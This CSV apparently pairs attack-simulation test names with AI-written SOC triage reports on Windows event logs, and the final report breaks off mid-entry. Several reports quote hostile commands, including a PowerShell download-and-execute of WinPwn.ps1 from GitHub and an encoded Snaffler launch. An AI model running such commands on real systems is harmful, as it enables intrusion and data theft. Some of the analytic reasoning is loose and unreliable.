Directory Name,AI Response
Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,"### Analysis of Logs

#### 1. **PowerShell Log Analysis:**
- The logs show multiple PowerShell 600 events with a consistent pattern of starting providers such as Registry, Alias, Environment, and more.
- The command executed is `powershell.exe & {get-addefaultdomainpasswordpolicy}`. This retrieves the default domain password policy details.
- Although using PowerShell to retrieve password policies could be part of legitimate administrative tasks, it is often abused by threat actors to gather information about password policies for lateral movement purpose.

#### 2. **System Log Analysis:**
- Time changes were logged at roughly the same timestamps, indicating potential tampering with system time settings. A process `svchost.exe` is making these changes.
- Time changes can be used to alter log file timestamps or evade detection mechanisms that rely on time-based logging.

#### 3. **Sysmon Log Analysis:**
- Numerous `wevtutil.exe` and `conhost.exe` executions by the user `SERVER002\admin_test` were noted. The `wevtutil` is used to query event logs which might indicate log forensic tampering or log clearance attempts.
- `whoami.exe` execution noted, which shows attempts to enumerate current user information, common during reconnaissance.
- The execution of `powershell.exe` with similar command to that noted in the PowerShell logs indicates repeated access to password policy information.

#### 4. **Security Log Analysis:**
- There are event ID 4616 indicating system time change actions by `svchost.exe`. Time skewing is often associated with tampering or activities aimed at obfuscating true timeline events.

#### 5. **Application Log Analysis:**
- There is a Software Protection Platform Service log but not out of ordinary context; it may simply denote activation or licensing checks routine.

### Assessment of Situation:
- **Triggers Indicating Compromise:**
  - **Information Gathering:** Execution of commands to gather sensitive system and user information, typical in reconnaissance phases.
  - **Time Tampering:** Abnormal activity around system time changes suggests possible evasion attempts.
  - **Excessive Event Log Access**: Frequent `wevtutil` usage without clear purpose suggest attempts to access or modify logs, potentially to hide malicious actions.

### Guidance Moving Forward:
1. **Immediate Actions:**
   - Investigate the `admin_test` account, including its role and permissions, to confirm if activities align with legitimate administrative actions.
   - Correlate these events with other logs on the network domain for any anomalous patterns or associated indicators of compromise.
   - Check for unauthorized changes to Group Policy Objects which might correspond to password policy queries.

2. **Recommend Further Investigation:**
   - Network activity surrounding these log events for remote connections, especially with unknown IP addresses.
   - Confirm other systems for similar patterns of PowerShell or time-changing activity.

3. **Resolution Decision:**
   - **SUSPICIOUS**: Though there's no clearly severe action noted, the patterns observed are usually associated with early-stage compromise activities and warrant additional scrutiny, especially the time alterations and log queries.

This observation doesn't conclusively state a malicious incident but indicates enough concern for focused follow-up investigation and monitoring as precautionary steps."
WinPwn - generaldomaininfo,"Upon examining the logs provided, I have identified several elements that require attention and further analysis to assess potential malicious activity:

### Detailed Analysis:

1. **PowerShell Activity:**
   - The PowerShell logs show multiple instances of PowerShell being used to execute suspicious script commands. The command-line invocation: 
     - `powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), generaldomaininfo -noninteractive -consoleoutput}`
   - This command is downloading and executing a script from an external GitHub repository. This behavior is suspicious as it involves downloading potentially untrusted code from the internet and executing it, which can be a vector for malicious activities.

2. **Process Execution Pattern:**
   - The Sysmon logs reveal the execution of the `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
   - The repeated use of system utilities like `wevtutil.exe`, typically for event log management, by a user account, especially in close conjunction with `conhost.exe`, can imply attempts to manipulate event logs or hide malicious activity.

3. **System and Security Logs:**
   - Time changes recorded in the System logs (`Security Audit 4616`) executed by `svchost.exe` process can indicate tampering, although alone, time synchronization is quite common.
   - No explicit evidence of privilege escalation attempts or successful unauthorized access is noted in these entries provided.

4. **Edge Update and SPP:**
   - The Application logs and subsequent correlated Sysmon logs detail the regular update activity of Microsoft Edge. This shows normal patching and updating activity, which implies normal system maintenance and thus appears benign.

### Assessment of the Situation:

The most concerning entry within these logs is the PowerShell command executed. It downloads and runs a script from an internet source, which suggests the possibility of unauthorized actions or data exfiltration orchestrated by running prebuilt scripts aiming to gather domain information.

### Recommendation:

Based on the suspicious use of PowerShell to download and execute a remote script, there is a risk that the system might be compromised or is being used in a manner unauthorized by the IT policy. Before concluding on a malicious incident, further investigation should be carried out by examining what the specific downloaded scripts are intended to do and whether similar activities are occurring on other systems.

I would advise adopting the following measures:

1. **Isolate the affected machine** to prevent further potential misuse.
2. **Investigate the downloaded script manually** to determine its nature and behavior.
3. **Review network traffic logs** to monitor any further similar suspicious traffic to/from this host.
4. **User behavior analysis** for `admin_test` to ensure the account wasn't compromised.
5. **Strengthen PowerShell logging and disable script execution** policy unless necessary for operations, especially downloading from external locations.

### Final Resolution:
- **SUSPICIOUS:** The activity involves behaviors that are indicative of potential malicious intent or misuse of the system, necessitating a more thorough investigation."
ESXi - VM Discovery using ESXCLI,"### Detailed Analysis of the Logs

The logs provided contain several events across different Windows event log channels which I analyzed for any indicators of malicious activity or potential compromise. Here's a breakdown of the key findings:

#### Security Log Analysis:
1. **Event ID 4624 (Logon Success):** Multiple entries indicate successful logons using Logon Type 5 which is a service logon. This is commonly seen with the SYSTEM account and doesn't inherently indicate malicious activity.

2. **Event ID 4672 (Special Privileges Assigned):** The SYSTEM account is granted special privileges. This is typical for SYSTEM-level accounts to operate various services and isn't suspicious in this context.

3. **Event ID 4798 (Security Group Enumeration Request):** There are numerous entries showing that enumeration of security groups occurred via `taskhostw.exe` which can be used to host DLL-based services or tasks. This could potentially be used for reconnaissance by an attacker but is also seen in normal operations.

4. **Event ID 5379 (Logon Failed):** Several repeated entries indicating credential read failures from a Microsoft account or Windows Live token. The consistent failure here might suggest credential harvesting attempts but could also be due to misconfiguration or a system process error.

#### Sysmon Log Analysis:
1. **Suspicious Process Executions:**
   - The logs reveal multiple executions of `plink.exe`, a command-line tool similar to SSH, running under the context of `admin_test`. The command line indicates a connection attempt using hardcoded credentials, which is a significant red flag for unauthorized remote access attempts or lateral movement.

2. **Use of PowerShell and Wevtutil:** 
   - **Powershell.exe:** Executed by `admin_test`, which is common in both administrative and malicious scenarios. Without specific PowerShell event details, it is hard to determine intent.
   - **Wevtutil.exe:** A legitimate utility used to manage Windows event logs, but if executed in conjunction with suspicious commands, could indicate attempts to tamper with logs or investigate system logs illicitly.

3. **Reconnaissance Commands:**
   - Execution of commands like `whoami.exe` and `hostname.exe` can be part of normal administrative scripts but are often used in reconnaissance by attackers to gather system information.

4. **Spawns from Command Prompts (cmd.exe):** The execution chain shows usage of `cmd.exe`, which executed `plink.exe` and other commands akin to scripted malicious activity.

5. **Network Connections Made by External Utilities (`plink.exe`):** Indicate unauthorized outbound connections possibly aimed at data exfiltration or remote system control.

#### Application and PowerShell Logs:
- The available logs for these categories did not provide any immediate signs of anomalies or indicators of compromise. However, PowerShell logs could have offered more insight into potential script-based attacks.

### Conclusion & Guidance:

Based on the analysis, there are several indicators pointing towards potentially unauthorized or illicit use of the system:
- Execution of `plink.exe` with hardcoded credentials for SSH to a remote host.
- Enumeration of security groups which might be related to reconnaissance.
- Failed credential access attempts on Microsoft accounts.

**Resolution: MALICIOUS**

### Recommended Actions:
1. **Isolate the Device:** Immediately isolate the affected machine from the network to prevent potential data exfiltration or spreading lateral movement.
2. **Forensic Analysis:** Conduct a detailed forensic investigation, focusing on the files and scripts executed on the system.
3. **Credential Audit:** Change all credentials used on the affected system, primarily focusing on high-privilege accounts such as `admin_test`.
4. **Log Review & Monitoring:** Increase monitoring on similar activities across other hosts for potential spread or similar tactics.
5. **Patch and Harden Systems:** Ensure all systems are up-to-date on patches and have sufficient protective mechanisms against unauthorized remote accesses like the one observed.

These steps are crucial to mitigate potential risks and ensure that any unauthorized persistence mechanisms are eradicated."
WinPwn - printercheck,"Upon review of the provided event logs, several notable activities stand out, highlighting potential security concerns:

1. **PowerShell Execution**: 
   - Multiple entries show PowerShell being executed with a suspicious command line: `""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')...}`.
   - This command attempts to download and execute a script from an external source (""WinPwn.ps1""), commonly associated with potentially malicious activity.
   - The use of `iex(new-object net.webclient).downloadstring(...)` is a known method for executing code directly from the internet, which is often leveraged by attackers to execute payloads.

2. **High Integrity Levels and Administrative Execution**:
   - Many activities, including PowerShell and other command executions (such as `wevtutil.exe` and `conhost.exe`), are executed under the `SERVER002\admin_test` user with high integrity.
   - This implies a level of privilege that, if compromised, could allow malicious actors considerable control over the system.

3. **Process Anomalies**:
   - Several `wevtutil.exe` processes are started in rapid succession. `wevtutil.exe` is a legitimate utility for exporting, archiving, and clearing event logs, but its repetitive and concurrent invocation might hint at tampering or malicious log clearing.
   - Frequent execution of `conhost.exe` without a clear, legitimate pattern also raises questions about whether it’s being used to host similar console-based applications or commands in a concealed manner.

4. **Edge Update Activities**:
   - Multiple events involving `MicrosoftEdgeUpdate.exe`, including processes running with `NT AUTHORITY\SYSTEM`, indicate typical update activities.
   - However, no direct correlation to malicious activity is observed in these specific logs, suggesting these processes relate to legitimate application updates.

5. **Timezone Adjustment and System Time Changes**:
   - The security and system logs show events related to time changes. While these can be benign, frequent time modifications might be used to mislead investigators or incident response tools by altering timestamps.

**Assessment and Resolution**:
- **MALICIOUS**: The PowerShell activity that involves downloading and executing a script from a potentially untrusted source is a strong indicator of malicious activity. This activity could suggest attempts to conduct various malicious actions, such as information gathering, privilege escalation, or system exploitation.
  
**Guidance on How to Proceed**:
- Immediately block and isolate the host (Server002) from the network to prevent further access or propagation of any possible threats.
- Conduct a thorough forensic analysis of the system to determine the full extent of the compromise, focusing on additional potential malware or unauthorized access.
- Reset all administrative credentials associated with the system.
- Review network traffic logs to identify communications with the external site and other potential callbacks or data exfiltration attempts.
- Consider restoring the system from a known clean backup after ensuring no persistence mechanisms or residual malicious processes are present. 

These steps should help mitigate the threat posed by the identified suspicious PowerShell execution and any potential follow-on actions initiated by the downloaded script."
Security Software Discovery - AV Discovery via WMI,"Upon analyzing the provided logs, we identify a few points of interest:

1. **Time Changes**: Multiple `EventID 4616` entries in the Security logs suggest frequent updates to the system time via `svchost.exe`. Additionally, the System log events show similar time changes, indicating potential tampering or synchronization activities in a short period. While system time changes can occur legitimately (e.g., NTP synchronization), frequent and closely timed changes could indicate an attempt to obscure activities or replay time for malicious activities.

2. **Process Execution**: The Sysmon logs capture several process creations under the `SERVER002\admin_test` user:
   - Several instances of `wevtutil.exe` and `conhost.exe` executions. `wevtutil.exe` is used to manage event logs, which might indicate someone manipulating logs.
   - Usage of `hostname.exe` and `whoami.exe` can suggest reconnaissance activities or user context verification on the machine, which is common in lateral movement or enumeration attempts.
   - `cmd.exe` executes a command to observe installed antivirus products, stating: `wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`. This could be an attempt to identify security defenses present on the machine.

3. **Privilege Levels**: A significant number of processes are running with High Integrity Level under the `SERVER002\admin_test` user identifier, which can suggest potential privilege escalation or administrative level access being used.

4. **Absence of PowerShell Logs**: There is no data provided for PowerShell logs which inhibits evaluation of potential script-based activities if any were present.

### Assessment

- The activities observed, such as frequent system time changes, repeated use of utilities for reconnaissance, and potential exploration of system defenses, are indicative of suspicious behavior.
- The attempts to explore antivirus defenses and frequent processes using administrative privileges warrant concern for possibly malicious activities.

### Resolution

Given the evidence of reconnaissance, potential log manipulation, and elevated privilege usage outside typical operating patterns, the logs are assessed as:

**SUSPICIOUS**

### Recommendations for Further Investigation

1. **Conduct a comprehensive audit** of the `SERVER002` machine:
   - Investigate service accounts and privileges, especially `admin_test`.
   - Review installed security solutions and monitor any bypass or modification attempts.

2. **Inspect for persistence mechanisms** by reviewing Run keys, scheduled tasks, and startup folders.

3. **Network Analysis**: Check for suspicious outbound connections or abnormal network traffic.

4. **Preventive Measures**: Strengthen monitoring and alerting for suspicious process execution and privileged account activities.

5. **Correlate** with other logs and events to determine if this behavior is isolated or part of a broader campaign."
File and Directory Discovery (cmd.exe),"Upon reviewing the provided Windows event logs, let's go through a detailed analysis of the observed activities:

### Analysis of Anomalies and Suspicious Behavior:
1. **Time Alteration Events**:
   - The repeated time change logs (`EventID 24 and 1` from the `Microsoft-Windows-Kernel-General`) indicate system time adjustments. Time modifications can be a tactic to evade detection by timestamp manipulation, although in this instance, they seem permissible as they are adjusted forward by very minor increments and are executed by `svchost.exe`, a legitimate Windows process.

2. **System and Application Events**:
   - **Windows Update Client Events** (`EventID 44`): Numerous logs related to Windows updates indicate typical update activities. The presence of updates such as Microsoft VCLibs, .NET Native, and Your Phone suggests regular update activity.
   - **Microsoft Edge Updates**: There are several instances of Microsoft Edge update processes, including `MicrosoftEdgeUpdate.exe`, which appear to be consistent with legitimate software update checks and installations.

3. **Suspicious Command Execution**:
   - **Sysmon Log - `cmd.exe` Command**:
     - A significant indicator of potentially suspicious behavior is the execution of a `cmd.exe` command (`Sysmon EventID 1`), which aggressively enumerates directory contents and diverts the output to a temporary file (`%temp%\dataTest1.txt`). While `dir` commands are not inherently malicious, running them en masse and systematically writing outputs to a file could suggest data gathering consistent with reconnaissance or pre-exfiltration activities. 
     - This command was executed from a high integrity level and originated from `wsmprovhost.exe`, which is used for remote management, potentially indicating an external actor's interaction through tools like PowerShell or WMI.

4. **Security Log Review**:
   - **Privilege Assignments and Logon Events** (`EventID 4672 & 4624`): Multiple logs show system-level privilege assignments and successful service logons primarily using `LogonType 5` (service start). 
   - **Event 4798** - User Enumeration: Taskhostw.exe querying user account details several times indicates an account enumeration activity often associated with discovery phases of attack patterns.

### Assessment:
- **No Direct Indicators of Compromise**: Apart from the `cmd.exe` execution, most events appear routine, involving time corrections, Windows updates, and Edge updates, which are typical of background system maintenance tasks. The processes run by system authorities and service accounts largely align with expected operations.
- **Suspicious `cmd.exe` Usage**: The series of directory listing commands executed by `cmd.exe` merit further investigation due to their potential ties to unauthorized data access strategies.

### Resolution:
Given the current analysis of the logs provided and the nature of the activities observed, I am inclined to categorize this situation as **SUSPICIOUS**.

### Recommendation:
- **Further Investigation**: Perform deeper investigation on the source of the `cmd.exe` execution, particularly identifying any anomalous user activities around the `wsmprovhost.exe` process invocation.
- **Audit Bash Execution**: Verify if this command sequence could relate to a known management script elsewhere in the enterprise and confirm user access approvals.
- **Check for Unauthorized Access**: Review logs and access controls on the CEO's machine to validate no unauthorized remote connections were made.
- **Monitor and Alerts**: Increase monitoring for similar unusual file system access patterns and set alerts for directory enumeration commands especially when logged under a non-consumer phenomenology.

By following these steps, the organization can ensure a thorough handling of suspicious activities while protecting system integrity and identifying potential risks to data security."
System Time Discovery W32tm as a Delay,"In analyzing the provided Windows event logs for Server002, we need to assess any particularly unusual or potentially malicious activity. Here are the notable observations from the logs:

1. **Repeated Process Executions**:
   - There is evidence of multiple common Windows utilities being executed frequently, such as `whoami.exe` and `conhost.exe`. However, these processes can be considered typical in certain scenarios, like determining the current user context or managing console windows.
   - Notably, `wevtutil.exe` was executed several times. This utility is generally used to query or manipulate event logs and could indicate log tampering attempts. However, it running alone is not inherently suspicious without evidence of further unauthorized actions.

2. **Processes Executed by High-Integrity User Context**:
   - The Sysmon logs show processes (`whoami.exe`, `cmd.exe`, `w32tm.exe`) being run under a high-integrity context by the `admin_test` user. This might indicate administrative-level activity, which should be examined to confirm it aligns with known expected administrative tasks.

3. **Time Synchronization Activities**:
   - The Security and System logs indicate time synchronization activities (`Time Source: time.windows.com`). This appears benign as it's a scheduled activity for accurate timekeeping across systems.

4. **Microsoft Edge Update Processes**:
   - A series of operations relate to `MicrosoftEdgeUpdate.exe`. The commands executed appear standard for updating purposes and maintenance of the Microsoft Edge browser, with multiple processes spawned under `NT AUTHORITY\SYSTEM`.

5. **SPP Service**:
   - The presence of the `Software Protection Platform Service` in the Application log indicates benign operations typically related to license management and product activation.

**Overall Assessment**:
The logs show high-frequency process activity, but the majority appear to be legitimate administrative activities and regular updates of software (Microsoft Edge). There are no clear indications of unauthorized access or privilege escalation attacks. Wevtutil.exe execution could potentially be investigated further, but as standalone entries, they aren't immediately indicative of malicious intent.

**Resolution**: **BENIGN**

The logs do not contain any explicit indicators of malicious activity. The executed processes and actions seem to correlate with standard administrative operations and scheduled tasks, such as time synchronization and software updating. However, if these activities are unexpected or not logged in administrative documentation, further inquiry could be made to confirm their legitimacy."
Adfind - Query Active Directory Groups,"To analyze the provided event logs for signs of malicious activities, let's break down the series of logged events and highlight any potentially suspicious activities.

### Analysis Summary:

1. **Security Log:**
   - **Event ID 4624 (Successful Logon):** 
     - The log shows a Type 5 logon, which indicates a service logon typically used by services during startup. The logon was performed by the `SYSTEM` user using the `services.exe` process. This is standard behavior and not considered suspicious.
   
   - **Event ID 4672 (Special Privileges Assigned):** 
     - The `SYSTEM` user was granted a series of high-level privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc. These are typical for the `SYSTEM` account which requires broad capabilities; however, they warrant careful monitoring to ensure they are not leveraged for unauthorized activities.

2. **Application Log:**
   - Windows Defender is reported as actively running (`SECURITY_PRODUCT_STATE_ON`). This suggests that endpoint protection is operational, reducing the chance of successful exploitation.

3. **Sysmon Logs:**
   - The Sysmon logs exhibit several processes executed by the `admin_test` account:
     - **The Execution of `powershell.exe` (Event ID 5):** 
       - The admin_test account has run PowerShell, which can be used benignly as well as maliciously (often seen in lateral movement or execution of scripts). Without additional information on the command or script executed, this action poses a potential risk.
     - **Repeating Execution of `wevtutil.exe`:**
       - `wevtutil.exe` is used to manage Windows Event Logs. Its execution multiple times in quick succession can be indicative of someone trying to clear or alter event logs to cover tracks, a potentially suspicious behavior.
     - **Use of `adfind.exe`:**
       - The command `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AdFind.exe"" -f (objectcategory=group)` is of concern.
       - `AdFind.exe` is a known utility to query Active Directory, often used by attackers post-compromise for recon activities.
     - **Execution of Administrative Tools:**
       - Tools like `whoami.exe` and `hostname.exe` were also run. These are common utilities to gather information about the system and user context. Their benign use is possible, but they often appear in suspicious contexts as reconnaissance tools.

### Assessment:

- **Privileges and Log Operations:** The elevated privileges and manipulations around Windows Event Logging through `wevtutil.exe` merit further investigation.
- **Reconnaissance Indicators:** The execution of `AdFind.exe` and PowerShell by `admin_test` suggests potential reconnaissance or testing of AD environments by unauthorized users.
- **Repeated Process Executions:** Such as the repetitive execution of `conhost.exe` and `wevtutil.exe`, can indicate attempts to mask activities.

### Recommendation:

Given the context of the logged activities, it is advised to escalate this situation for further investigation. Specifically, the execution and purpose of `AdFind.exe`, the commands run via PowerShell, and the need for multiple `wevtutil.exe` invocations should be clarified. Check for user behaviors around these logs to authenticate legitimate activities.

### Resolution: SUSPICIOUS

Activities are suspicious due to potentially unauthorized use of high-privilege commands and reconnaissance tools. Further investigation is necessary to determine malicious intent or benign misconfiguration/use."
Hostname Discovery (Windows),"Based on the analysis of the provided Windows event logs from the CEO's machine, here are the key points and findings:

1. **Time Adjustments**: Multiple events in the System and Security logs indicate a change in system time. This activity is generally benign, as it could result from time synchronization attempts against trusted time servers, such as `time.windows.com`.

2. **Process Executions**:
    - **Sysmon Logs**: The frequent execution of `C:\\Windows\\System32\\wevtutil.exe` and `C:\\Windows\\System32\\conhost.exe` by user `SERVER002\\admin_test` stands out. While these are legitimate Windows binaries, their pattern may warrant further investigation if there's no clear operational reason.
    - **PowerShell Logs**: Not provided, which means no specific PowerShell-related activity was logged. PowerShell activity can often be used in malicious operations, so the absence of logs could be notable, especially if custom logging is expected.
    - **Edge Update Activity**: Extensive update activities related to Microsoft Edge Update services are visible throughout the logs. These processes running under `NT AUTHORITY\\SYSTEM` are typical when the system automatically updates software; it doesn't appear suspicious.

3. **Security Events**:
    - **Privilege Escalation**: Multiple logins with elevated privileges (Event ID 4672), such as `SeDebugPrivilege` and others, which are necessary for system maintenance but unusual for standard operation without specific reasons.
    - **Logon Activity**: Several logon events (Event ID 4624) from local and remote IPs, which are expected as part of normal operations, depend on the network environment.

4. **Indicators of Compromise**: 
    - No unequivocal indicators of compromise were detected such as known malicious payloads or exotic command-line arguments commonly used in attacks.

5. **Assessment**:
    - The logs do not provide clear evidence of a malicious compromise but show repetitive and somewhat unusual patterns in system utility execution, especially the frequent calling of `wevtutil.exe` and `conhost.exe`. 
    - Given the context of the CEO’s critical machine, the privilege escalations and process activities should be verified against known administrative tasks or maintenance routines.

6. **Resolution**: 
   - **SUSPICIOUS**: There is activity that doesn't look right and requires further investigation. The execution patterns of `wevtutil.exe` and `conhost.exe` need verification against legitimate usage scenarios. Additionally, ensuring time change logs correlate with authorized activities can aid in clearing suspicions.

### Guidance on How to Proceed:
- **User Inquiry**: Investigate if the elevated privileges and process executions are tied to any authorized administrative tasks or remote management scripts/automation.
- **System Logs**: Review potential misconfigurations or anomaly detection setups that might have triggered such activity.
- **Network Traffic**: Analyze network logs possibly related to the IPs found in logon activities to assure they align with known/expected network behavior and connections.
- **EDR Investigation**: Ensure EDR settings are correctly configured to detect deviations from baseline behavior and compare with known safe activities."
Reg query for AlwaysInstallElevated status,"### Detailed Analysis of the Logs

#### System Log:
- The logs primarily contain Windows Update activities related to updating Microsoft Defender Antivirus (KB2267602 Version 1.419.618.0). There is no indication of any anomaly as these are routine update processes.

#### Security Log:
- Event ID 5379 indicates Credential Validation operations showing ""CountOfCredentialsReturned"": ""0"", which means no credentials were returned.
- The ""ReturnCode"" of ""3221226021"" typically corresponds to an ""unknown user name or bad password."" The repeated failed attempts could suggest mistyped credentials or incorrect automated service configuration. 
- However, without evidence of repeated attempts from unusual sources or abnormal times, this alone doesn't suggest malicious activity.

#### Sysmon Log:
- The repeated use of `wevtutil.exe`, `conhost.exe` alongside user `admin_test` may imply an administrative task or script execution, possibly involving checking or managing event logs. 
- A benign use of `hostname.exe` and `whoami.exe` is noted, typically used for system checks or audits by administrators.
- The execution of `cmd.exe` with `reg query` commands points towards checking a registry setting (`AlwaysInstallElevated`). This setting, if enabled, allows users to install software with elevated privileges. No modifying actions are evident in these logs. The query could indicate a legitimate security check.
- Execution of Microsoft Edge Update and standard Windows Defender update processes looks normal. The process attributes such as SHA256 hashes and command lines appear consistent with known legitimate software.

#### Application Log:
- Event indicates Windows Defender is active and running with a state ""SECURITY_PRODUCT_STATE_ON"". This suggests the host’s antivirus protection is operational, further reducing the likelihood of undetected threats.

### Assessment:

**Overall, the logs do not contain any definitive indicators of compromise or direct malicious activity.** Each activity observed, including credential validation failures and registry queries, can be contextually attributed to legitimate administrative operations or misconfigurations rather than malicious attempts.

### Conclusion:
**Resolution: BENIGN**

### Guidance:
- Despite the benign assessment, it would be prudent to verify if the repeated credential validation errors were expected, perhaps due to service account misconfigurations, and address any potential issues there.
- Review administrative operations or scripts being executed under the `admin_test` account to ensure they align with organizational policies and best practices.
- Regularly audit systems for registry keys like `AlwaysInstallElevated` to ensure they do not introduce security risks. Consider documenting such checks in a security procedure for future audits.

Given the logs' overall benign nature, no immediate action beyond routine checks and audits is necessary. Maintaining vigilance with regular monitoring and ensuring strict adherence to security standards would continue to mitigate risks effectively."
Enumerate all accounts on Windows (Local),"Upon analyzing the provided Windows event logs for Server002, several points of interest emerge:

1. **Edge Update Activity:**
   - There are numerous entries related to `MicrosoftEdgeUpdate.exe`. These entries detail various operations such as `/update`, `/regsvc`, `/svc`, `/c`, and `/ua /installsource core`. It's common for update services to perform such tasks, but their repetitiveness and the use of multiple directories - including a temporary directory - suggest a potentially automated or scripted task.

2. **Command Execution:**
   - Entries show the execution of commands such as `whoami.exe` and `cmd.exe` with a sequence of administrative commands: checking users and directories, reviewing local group memberships, and listing stored credentials (`cmdkey.exe /list`), as executed by `SERVER002\\admin_test`. This is suspicious as it indicates an exploration of user roles and credentials, potentially preparing for credential escalation or user reconnaissance.

3. **Sysmon Events:**
   - Processes such as `wevtutil.exe` and `conhost.exe` appear frequently with `SERVER002\\admin_test` as the user, which could indicate system event log manipulation attempts.
   - The frequent execution of system and administrative commands may point to sequences typical of penetration testing or exploitation frameworks.

4. **Security and System Logs:**
   - Security logs track actions performed by `admin_test`, suggesting reconnaissance activities. 
   - System logs indicate time adjustments, reflecting potential time manipulation or synchronization, yet they appear to align with typical operations and do not directly point to nefarious actions without additional context.

5. **Credential Access Activities:**
   - Event 5379 logs a failed credential reading operation using the `cmdkey.exe` tool, which is concerning in the context of potential attempts to enumerate or exfiltrate user credentials.

6. **Process Integrity and User:**
   - Most processes run with High Integrity Level under NT AUTHORITY\SYSTEM, which is expected for system-level tasks and update operations but should be correlated against expected behaviors.
   
**Assessment:**
Given the evidence from the logs, the actions point towards behavior that is not typical of regular system updates, due to the vast number of potentially reconnaissance-oriented commands executed under a non-system admin account. The consistent theme of credential and user-based commands suggests potential malicious activity or compromise, especially in the context of these commands being executed without explicit administrative task tools being fired beforehand (no visible tool explicitly elevating privileges here).

**Resolution: SUSPICIOUS**

**Guidance:**
1. Conduct further investigation on `SERVER002\\admin_test` activities to confirm whether these command sequences were intentional and authorized.
2. Review any scheduled tasks or scripts that might correlate with the repeated update and command execution patterns.
3. Check for external connections during this time frame to uncover potential data exfiltration or unauthorized access.
4. Validate the integrity and source of the `MicrosoftEdgeUpdate.exe` processes, ensuring they're part of legitimate updates.
5. Conduct a full security audit on Server002 to assess potential risks or presence of malicious software."
Adfind - Enumerate Active Directory Computer Objects,"Upon analysis of the provided logs for the Windows host, here are the key observations and assessment:

### Security Log Analysis:

1. **Event ID 4624 and 4672** - These events indicate successful logon with special privileges. The logon type is 5, which refers to a service logon, and is often seen for system operations. The associated user is ""SYSTEM"" which is expected for legitimate system processes.

2. **Event ID 5379** - Multiple events showing credential access attempts for Microsoft Account and Windows Live tokens. All had a return code of `3221226021`, indicating access denial or failure. This could suggest an application or script trying and failing to access certain credentials. The frequency and nature of these logs can hint toward something attempting unauthorized access repeatedly.

### Application Log Analysis:

- **Security Product State** - Logs indicate Windows Defender being in ""SECURITY_PRODUCT_STATE_ON"" consistently, which suggests that the antivirus/antimalware service was active and operational during the timeframe of these events.

### Sysmon Log Analysis:

1. **PowerShell Execution** - There is a record of PowerShell being executed. PowerShell's execution is generally expected on servers, but it's important to ascertain the commands that were run to ensure they are not malicious. The event did not provide specific command-line details beyond the typical executable path.

2. **Suspicious Executions**:
   - **AdFind.exe Execution**: The command mentioned is indicative of directory reconnaissance activities often employed in a discovery phase of an attack (e.g., finding assets in a network).
   - The tool being run from a temp location further flags this as suspicious because attackers often drop tools in temp directories.

3. **Common Administrative Utilities (wevtutil, conhost, hostname, whoami)** - Usage of these utilities can be part of normal operation, but in coordination with suspicious PowerShell and AdFind execution, they warrant further context-specific analysis to confirm or deny malicious use.

4. **Frequent execution of utility processes**: Many events record processes started under the `SERVER002\admin_test` account executing typical administrative tools. This can be normal or suspicious depending on the system’s operational context and should be validated against expected usage patterns.

### Windows PowerShell Log Analysis:

- No logs were provided, which limits the depth of analysis for PowerShell activities.

### System Log Analysis:

- **Windows Update Activities** - Multiple records indicate typical Windows Update routines. If these updates align with expected or planned updates, they are considered normal activities.

### Conclusion:

Based on the logs analyzed, the presence of the `AdFind.exe` tool being executed in a manner often associated with reconnaissance, along with failed credential read attempts, raises suspicion. However, without more detailed context, especially surrounding the intent and context of these actions, it cannot be classified as outright malicious. Nevertheless, given these activities, further investigation is warranted. Specifically, the nature of the PowerShell executions, the intent behind `AdFind.exe`, and the reasons for failed credential attempts should be scrutinized.

### Resolution:
**SUSPICIOUS** - These logs contain activity indicative of potential reconnaissance and failed credential access attempts that need further investigation to rule out or confirm malicious intent. 

### Guidance:
1. **Investigate `AdFind.exe` Execution**: Determine why this tool was executed, whether it was authorized, and where it originated from.
2. **Analyze PowerShell Activity**: Secure details of the PowerShell commands executed during this period.
3. **Validate Failed Credential Access**: Consider the context and reasoning behind the failed Microsoft account and token accesses.
4. **Review Account Usage**: Ensure `SERVER002\admin_test` account activities align with authorized behaviors.
5. **Monitor Network Traffic**: Look for any unusual outbound connections that may correlate with reconnaissance tools use.

If any of these analyses reveal actions beyond expected or authorized activities, proceed with containment and remediation plans per your security protocols."
Enumerate All Network Shares with Snaffler,"Upon analyzing the provided event logs, several indicators suggest potential suspicious activity, focusing primarily on the execution of the ""Snaffler.exe"" tool and associated PowerShell activities.

### Key Observations:
1. **PowerShell Activity:**
   - The logs show multiple invocations of PowerShell executing encoded and inline commands, which include running ""Snaffler.exe"".
     - PowerShell is executed with encoded commands suggesting obfuscation: `powershell -encodedCommand IABjAG0AZAAgAC8AYwAgACIAQwA6AFwAVQBzAGUAcgBzAFwAQQBEAE0ASQBOAF8AfgAxAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwALgAuAFwARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFMAbgBhAGYAZgBsAGUAcgAuAGUAeABlACIAIAAtAGEAIAAtAG8AIAAiACQAZQBuAHYAOgB0AGUAbQBwAFwAVAAxADEAMwA1AFMAbgBhAGYAZgBsAGUAcgBPAHUAdABwAHUAdAAuAHQAeAB0ACIAIAA=`
   - The commands involve invoking a command shell to start another instance of PowerShell, which in turn runs the ""Snaffler.exe"" application: `invoke-expression 'cmd /c start powershell -command { cmd /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\Snaffler.exe"" -a -o ""$env:temp\\dataSnafflerOutput.txt"" };`

2. **Process Hierarchy:**
   - The logs indicate nesting of processes where `powershell.exe` spawns `cmd.exe`, which further spawns another instance of `powershell.exe`. This kind of process nesting using PowerShell and CMD can be indicative of obfuscated or unauthorized behavior.
